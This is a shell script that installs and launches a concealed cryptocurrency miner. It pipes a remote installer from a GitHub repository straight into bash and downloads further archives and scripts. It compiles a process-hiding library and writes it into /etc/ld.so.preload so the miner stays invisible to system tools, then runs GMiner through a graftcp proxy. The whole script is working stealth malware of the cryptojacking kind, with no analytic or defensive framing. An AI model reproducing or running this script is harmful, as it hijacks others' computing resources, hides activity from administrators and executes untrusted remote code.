#!/bin/sh
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh | bash
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicGmi.zip
unzip magicGmi.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://github.com/develsoftware/GMinerRelease/releases/download/2.51/gminer_2_51_linux64.tar.xz
tar -xvf gminer_2_51_linux64.tar.xz
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/gmiEthermWsocks.sh
chmod +x gmiEthermWsocks.sh
graftcp ./gmiEthermWsocks.sh
